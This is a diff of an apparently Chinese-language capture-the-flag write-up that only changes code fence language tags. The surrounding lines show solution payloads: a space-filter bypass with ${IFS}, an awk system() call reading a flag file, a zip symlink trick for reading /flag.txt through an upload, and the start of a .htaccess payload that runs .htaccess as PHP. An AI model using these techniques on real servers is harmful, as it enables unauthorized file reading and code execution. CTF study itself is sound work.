@@ -49,7 +49,7 @@ cat${IFS}/flag
 
 解法:
 
-```
+```bash
 /usr/bin/awk BEGIN{system("cat /home/chal/flag")}
 ```
 
@@ -71,7 +71,7 @@ Source
 ![](https://i.imgur.com/lux3aQ3.png)
 
 使用Symbolic link將./index.html連結到/flag.txt
-```
+```bash
 ln -s /flag.txt index.html
 zip --symlink test.zip index.html
 ```
@@ -83,7 +83,7 @@ zip --symlink test.zip index.html
  - 檔案大小大於 0x100
 
 上傳.htaccess,把.htaccess當成php來執行
-```
+```php
 <FilesMatch .htaccess>
 SetHandler application/x-httpd-p\
 hp
